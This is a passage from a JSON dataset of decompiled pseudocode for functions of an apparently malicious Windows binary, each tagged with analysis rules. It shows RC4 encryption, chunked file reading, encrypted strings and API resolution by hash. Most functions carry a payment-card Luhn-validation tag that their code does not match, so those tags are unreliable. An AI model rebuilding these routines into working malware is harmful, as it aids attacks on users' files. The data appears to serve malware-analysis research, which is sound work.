        "decompiled_code": "\nchar * __cdecl fcn.00406dad(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    \n    if (arg_10h != 0) {\n        arg_8h_00 = arg_8h;\n        do {\n            cVar1 = arg_8h_00[arg_ch - arg_8h];\n            *arg_8h_00 = cVar1;\n            arg_8h_00 = arg_8h_00 + 1;\n            if (cVar1 == '\\0') break;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        if ((arg_10h != 0) && (arg_10h + -1 != 0)) {\n            fcn.0040524d(arg_8h_00, 0, arg_10h + -1);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 229
    },
    "00406e57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00406e57(int16_t *arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    \n    piVar3 = arg_8h;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    do {\n        piVar3 = piVar3 + -1;\n        if (piVar3 == arg_8h) break;\n    } while (*piVar3 != arg_ch);\n    piVar2 = NULL;\n    if (*piVar3 == arg_ch) {\n        piVar2 = piVar3;\n    }\n    return piVar2;\n}\n",
        "token_count": 174
    },
    "00406eda": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00406eda(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    \n    if (*arg_ch != 0) {\n        iVar1 = *arg_8h;\n        if (iVar1 != 0) {\n            iVar3 = arg_8h - arg_ch;\n            piVar2 = arg_ch;\njoined_r0x00406f02:\n            do {\n                if (iVar1 != 0) {\n                    if (*piVar2 == 0) {\n                        return arg_8h;\n                    }\n                    if (*(iVar3 + piVar2) == *piVar2) {\n                        iVar1 = *(iVar3 + piVar2 + 1);\n                        piVar2 = piVar2 + 1;\n                        goto joined_r0x00406f02;\n                    }\n                }\n                if (*piVar2 == 0) {\n                    return arg_8h;\n                }\n                arg_8h = arg_8h + 1;\n                iVar3 = iVar3 + 2;\n                iVar1 = *arg_8h;\n                piVar2 = arg_ch;\n            } while (iVar1 != 0);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 297
    },
    "00406fdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00406fdb(int16_t *arg_8h, int16_t *arg_ch, int16_t **arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int16_t iVar4;\n    \n    if (arg_8h == NULL) {\n        arg_8h = *arg_10h;\n    }\n    iVar4 = *arg_8h;\n    if (iVar4 != 0) {\n        iVar1 = *arg_ch;\n        piVar2 = arg_ch;\n        do {\n            while ((iVar1 != 0 && (iVar1 != iVar4))) {\n                iVar1 = piVar2[1];\n                piVar2 = piVar2 + 1;\n            }\n            if (*piVar2 == 0) break;\n            arg_8h = arg_8h + 1;\n            iVar4 = *arg_8h;\n            iVar1 = *arg_ch;\n            piVar2 = arg_ch;\n        } while (iVar4 != 0);\n    }\n    piVar2 = arg_8h;\n    if (*arg_8h != 0) {\n        do {\n            piVar3 = arg_ch;\n            if (*arg_ch != 0) {\n                iVar4 = *arg_ch;\n                do {\n                    if (iVar4 == *piVar2) break;\n                    piVar3 = piVar3 + 1;\n                    iVar4 = *piVar3;\n                } while (iVar4 != 0);\n            }\n            if (*piVar3 != 0) {\n                *piVar2 = 0;\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            piVar2 = piVar2 + 1;\n        } while (*piVar2 != 0);\n    }\n    *arg_10h = piVar2;\n    if (arg_8h == piVar2) {\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 445
    },
    "004070fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004070fe(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00407168(arg_8h);\n    iVar1 = arg_8h_00;\n    if (arg_8h_00 != 0) {\n        iVar1 = fcn.0040707e(arg_8h_00, arg_ch);\n        fcn.004051e4(arg_8h_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 130
    },
    "004071bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004071bb(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *arg_ch;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_8h[1] != 0) {\n        do {\n            arg_ch = *(arg_8h[2] + uVar2 * 4);\n            while (arg_ch != NULL) {\n                piVar1 = arg_ch[2];\n                if (*arg_ch != 0) {\n                    fcn.004051e4(*arg_ch);\n                }\n                if (arg_ch[1] != 0) {\n                    fcn.004051e4(arg_ch[1]);\n                }\n                fcn.00405181(*arg_8h, arg_ch);\n                arg_ch = piVar1;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_8h[1]);\n    }\n    fcn.00405181(*arg_8h, arg_8h[2]);\n    fcn.00405173(*arg_8h);\n    return;\n}\n",
        "token_count": 253
    },
    "0040748b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040748b(int32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar5 = 0;\n    if (*(arg_8h + 8) != 0) {\n        iVar4 = 0;\n        do {\n            arg_8h_00 = *(*(arg_8h + 0xc) + iVar4);\n            iVar3 = *(*(arg_8h + 0xc) + 8 + iVar4);\n            var_4h = 0;\n            puVar1 = arg_ch;\n            if (0 < arg_10h) {\n                do {\n                    iVar2 = fcn.00406b58(arg_8h_00, *puVar1);\n                    if ((iVar2 == 0) && (*(iVar3 + 4) == puVar1[1])) {\n                        iVar3 = (*arg_ch[var_4h * 3 + 2])(iVar3);\n                        if (iVar3 == 0) {\n                            return 0;\n                        }\n                        break;\n                    }\n                    var_4h = var_4h + 1;\n                    puVar1 = puVar1 + 3;\n                } while (var_4h < arg_10h);\n            }\n            uVar5 = uVar5 + 1;\n            iVar4 = iVar4 + 0xc;\n        } while (uVar5 < *(arg_8h + 8));\n    }\n    return 1;\n}\n",
        "token_count": 391
    },
    "00407542": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407542(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_20h;\n    \n    var_20h._0_1_ = 9;\n    puVar2 = &var_20h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.0040ac2d(arg_ch, arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 178
    },
    "00407599": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407599(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040ac2d(arg_10h, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "004075af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.004075af(uint arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t arg_10h_00;\n    uint var_114h;\n    uint var_20h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    iVar1 = fcn.00408ea5(&var_114h, arg_ch, arg_8h);\n    if (iVar1 != 0) {\n        var_10h = *arg_10h;\n        uStack16 = arg_10h[1];\n        uStack12 = arg_10h[2];\n        _auStack8 = arg_10h[3];\n        if (arg_18h != 0) {\n            do {\n                fcn.00408e62(&var_114h, &var_10h, &var_20h);\n                arg_10h_00 = 0x10;\n                if (arg_18h < 0x10) {\n                    arg_10h_00 = arg_18h;\n                }\n                fcn.004077d3(arg_14h, &var_20h, arg_10h_00);\n                arg_14h = arg_14h + arg_10h_00;\n                arg_18h = arg_18h - arg_10h_00;\n                for (puVar2 = &var_1h; *puVar2 = *puVar2 + '\\x01',  *puVar2 == '\\0'; puVar2 = puVar2 + -1) {\n                }\n            } while (arg_18h != 0);\n        }\n        fcn.004078cc(&var_114h, 0xf4);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 462
    },
    "00407682": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407682(void)\n\n{\n    int32_t iVar1;\n    uint arg_18h;\n    uint var_44h;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.00405dee(&var_44h, 0x30);\n    if (iVar1 != 0) {\n        fcn.00406625(0x420aa0, 0x80e, 10, 0x10, &var_14h);\n        var_4h._0_1_ = 0;\n        arg_18h = fcn.00406c91(&var_14h);\n        iVar1 = fcn.00409069(0x421380, &var_44h, 0x30, &var_14h, arg_18h);\n        if (iVar1 != 0) {\n            fcn.004078cc(&var_44h, 0x30);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 236
    },
    "00407788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407788(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_20h;\n    \n    fcn.00407599(arg_8h, arg_ch, &var_20h);\n    fcn.0040cdeb(arg_10h, 0x20, &var_20h, 0x20);\n    fcn.004078cc(&var_20h, 0x20);\n    return;\n}\n",
        "token_count": 107
    },
    "004077bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004077bf(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    \n    for (pcVar1 = arg_8h + -1 + arg_ch; *pcVar1 = *pcVar1 + '\\x01',  *pcVar1 == '\\0'; pcVar1 = pcVar1 + -1) {\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "004077f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.004077f8(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint8_t *arg_14h, uint8_t *arg_18h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    iVar3 = arg_14h;\n    uVar4 = 0;\n    uVar2 = 0;\n    do {\n        *(&var_104h + uVar2) = uVar2;\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x100);\n    uVar2 = 0;\n    do {\n        uVar1 = *(&var_104h + uVar2);\n        uVar4 = uVar1 + *(uVar2 % arg_ch + arg_8h) + uVar4 & 0xff;\n        *(&var_104h + uVar2) = *(&var_104h + uVar4);\n        uVar2 = uVar2 + 1;\n        *(&var_104h + uVar4) = uVar1;\n    } while (uVar2 < 0x100);\n    uVar2 = 0;\n    var_4h = 0;\n    if (arg_14h != NULL) {\n        arg_14h = arg_18h;\n        do {\n            uVar4 = var_4h + 1 & 0xff;\n            var_4h = uVar4;\n            uVar1 = *(&var_104h + uVar4);\n            uVar2 = uVar1 + uVar2 & 0xff;\n            *(&var_104h + uVar4) = *(&var_104h + uVar2);\n            *(&var_104h + uVar2) = uVar1;\n            *arg_14h = *(&var_104h + *(&var_104h + uVar4) + uVar1) ^ arg_14h[arg_10h - arg_18h];\n            arg_14h = arg_14h + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return arg_18h;\n}\n",
        "token_count": 529
    },
    "004078cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078cc(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040524d(arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 44
    },
    "00407979": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00407979(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint *arg_14h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_74h;\n    uint var_54h;\n    uint var_44h;\n    uint var_40h;\n    uint var_20h;\n    \n    *arg_14h = 0;\n    if (arg_10h == 0) {\n        arg_14h_00 = NULL;\n    }\n    else {\n        arg_14h_00 = fcn.00405197(arg_10h + 0x38);\n        if (arg_14h_00 != NULL) {\n            *arg_14h_00 = 0;\n            fcn.00405228(arg_14h_00 + 1, arg_ch, arg_10h);\n            fcn.0040751e(&var_20h, &var_74h);\n            fcn.00407788(&var_20h, arg_8h, &var_40h);\n            fcn.004078cc(&var_20h, 0x20);\n            fcn.004076f1(&var_54h, 0x10);\n            fcn.004075af(&var_40h, 0x100, &var_54h, arg_14h_00, arg_10h + 4);\n            fcn.004078cc(&var_40h, 0x20);\n            var_44h = fcn.00407642(0, arg_14h_00, arg_10h + 4);\n            puVar2 = &var_74h;\n            puVar3 = arg_10h + 4 + arg_14h_00;\n            for (iVar1 = 0xd; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = *puVar2;\n                puVar2 = puVar2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            *arg_14h = arg_10h + 0x38;\n        }\n    }\n    return arg_14h_00;\n}\n",
        "token_count": 510
    },
    "00407a42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407a42(uint8_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0x2b;\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        iVar1 = iVar1 * 0x10f + *arg_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 94
    },
    "00407b72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407b72(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00406625(0x420aa0, 0x5f5, 0xd, 0xc, &var_10h);\n    var_4h._0_1_ = 0;\n    puVar2 = &var_10h;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 144
    },
    "00407bab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407bab(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_1h;\n    \n    fcn.00406625(0x420aa0, 0x5cf, 0xd, 0xb, &var_ch);\n    var_1h._0_1_ = 0;\n    puVar2 = &var_ch;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 152
    },
    "00407be4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407be4(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_3h;\n    \n    fcn.00406625(0x420aa0, 0x2ec, 7, 9, &var_ch);\n    var_3h._0_1_ = 0;\n    puVar2 = &var_ch;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 151
    },
    "00407c29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00407c29(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    fcn.00406625(0x420aa0, 0x118, 4, 7, &var_8h);\n    _auStack8 = _auStack8 & 0xffffff;\n    puVar2 = &var_8h;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 155
    },
    "00407c6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407c6d(void)\n\n{\n    uint var_ch;\n    uint var_3h;\n    \n    fcn.00406625(0x420aa0, 0x7cc, 0xe, 9, &var_ch);\n    var_3h._0_1_ = 0;\n    fcn.00407fb8(&var_ch);\n    return;\n}\n",
        "token_count": 113
    },
    "00407c9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407c9e(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00406625(0x420aa0, 0x5aa, 9, 0xc, &var_10h);\n    var_4h._0_1_ = 0;\n    puVar2 = &var_10h;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 143
    },
    "00407cd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00407cd7(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t **ppiVar4;\n    int32_t **ppiVar5;\n    uint16_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00405913();\n    ppiVar5 = *(iVar2 + 0xc) + 0x14;\n    ppiVar4 = *ppiVar5;\n    if (ppiVar4 != ppiVar5) {\n        do {\n            piVar1 = ppiVar4[10];\n            uVar3 = 0x2b;\n            uVar6 = *piVar1;\n            while (uVar6 != 0) {\n                piVar1 = piVar1 + 2;\n                if (uVar6 - 0x41 < 0x1a) {\n                    uVar6 = uVar6 | 0x20;\n                }\n                uVar3 = uVar3 * 0x10f + uVar6;\n                uVar6 = *piVar1;\n            }\n            if (uVar3 == (arg_8h ^ 0x2013a924)) {\n                return ppiVar4[4];\n            }\n            ppiVar4 = *ppiVar4;\n        } while (ppiVar4 != ppiVar5);\n    }\n    return NULL;\n}\n",
        "token_count": 332
    },
    "00407e9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407e9b(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_1h;\n    \n    fcn.00406625(0x420aa0, 0x473, 5, 0xb, &var_ch);\n    var_1h._0_1_ = 0;\n    puVar2 = &var_ch;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 152
    },
    "00407ed4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407ed4(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_1h;\n    \n    fcn.00406625(0x420aa0, 0x30f, 6, 0xb, &var_ch);\n    var_1h._0_1_ = 0;\n    puVar2 = &var_ch;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 152
    },
    "00407f0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407f0d(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_2h;\n    \n    fcn.00406625(0x420aa0, 0x291, 0xd, 10, &var_ch);\n    var_2h._0_1_ = 0;\n    puVar2 = &var_ch;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 152
    },
    "00407f46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407f46(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_1h;\n    \n    fcn.00406625(0x420aa0, 0x85b, 5, 0xb, &var_ch);\n    var_1h._0_1_ = 0;\n    puVar2 = &var_ch;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 152
    },
    "00407f7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407f7f(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_3h;\n    \n    fcn.00406625(0x420aa0, 0x4e5, 9, 9, &var_ch);\n    var_3h._0_1_ = 0;\n    puVar2 = &var_ch;\n    pcVar1 = fcn.00407d52(0xce32665e);\n    (*pcVar1)(puVar2);\n    return;\n}\n",
        "token_count": 153
    },
    "00407ff2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ff2(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    *arg_ch = 1;\n    uVar3 = 0;\n    uVar1 = fcn.00405d35();\n    if ((uVar1 & 0x7fffffff) != 0) {\n        do {\n            (**0x413d98)(arg_8h[1], 0, 0, 0);\n            uVar3 = uVar3 + 1;\n            iVar2 = fcn.00405d35();\n        } while (uVar3 < iVar2 * 2);\n    }\n    while (arg_8h[2] != 0) {\n        fcn.004060d2(100);\n    }\n    fcn.00405173(*arg_8h);\n    fcn.0040536d(arg_8h[1]);\n    return;\n}\n",
        "token_count": 222
    },
    "00408051": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408051(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    *(arg_8h + 8) = 0;\n    uVar1 = fcn.00405d35();\n    if ((uVar1 & 0x7fffffff) != 0) {\n        do {\n            iVar2 = (**0x413d00)(0, 0, arg_ch, arg_8h, 0, 0);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            *(arg_8h + 8) = *(arg_8h + 8) + 1;\n            fcn.0040536d(iVar2);\n            uVar3 = uVar3 + 1;\n            iVar2 = fcn.00405d35();\n        } while (uVar3 < iVar2 * 2);\n    }\n    return 1;\n}\n",
        "token_count": 232
    },
    "00408161": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408161(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_ch;\n    int32_t iVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.004084b5(arg_8h, 0x80000000, 1, 3, 0);\n    var_8h = arg_8h_00;\n    if (arg_8h_00 != 0) {\n        arg_ch = fcn.00405197(0x100000);\n        var_8h = 0;\n        if (arg_ch != 0) {\n            var_8h = 0;\n            while( true ) {\n                iVar1 = (**0x413cfc)(arg_8h_00, arg_ch, 0x100000, &var_4h, 0);\n                if ((iVar1 == 0) || (var_4h == 0)) break;\n                var_8h = fcn.00407642(var_8h, arg_ch, var_4h);\n            }\n            fcn.004051e4(arg_ch);\n        }\n        fcn.0040536d(arg_8h_00);\n    }\n    return var_8h;\n}\n",
        "token_count": 298
    },
    "0040827a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040827a(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(arg_8h + 8);\n    *(arg_8h + 8) = uVar1 + arg_ch;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + arg_10h + CARRY4(uVar1, arg_ch);\n    return;\n}\n",
        "token_count": 117
    },
    "00408526": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00408526(int32_t arg_8h)\n\n{\n    return arg_8h - 2U < 3;\n}\n",
        "token_count": 34
    },
    "00408580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408580(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_2h;\n    \n    arg_8h_00 = fcn.00405197(0xfffe);\n    if (arg_8h_00 != 0) {\n        fcn.00406625(0x420aa0, 0x839, 0xb, 0xe, &var_10h);\n        var_2h._0_2_ = 0;\n        fcn.00406bfb(arg_8h_00, &var_10h);\n        fcn.00406af4(arg_8h_00, arg_8h + 2);\n        fcn.00406af4(arg_8h_00, 0x40ff4c);\n        fcn.004082ae(arg_8h_00, arg_ch);\n        fcn.004051e4(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "004085ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004085ee(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    puVar2 = fcn.00405197(8);\n    if (puVar2 != NULL) {\n        uVar3 = fcn.00406c56(arg_ch);\n        puVar2[1] = 0;\n        *puVar2 = uVar3;\n        if ((*arg_8h | arg_8h[1]) == 0) {\n            arg_8h[2] = puVar2;\n        }\n        else {\n            *(arg_8h[3] + 4) = puVar2;\n        }\n        arg_8h[3] = puVar2;\n        uVar1 = *arg_8h;\n        *arg_8h = *arg_8h + 1;\n        arg_8h[1] = arg_8h[1] + (0xfffffffe < uVar1);\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00408633": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
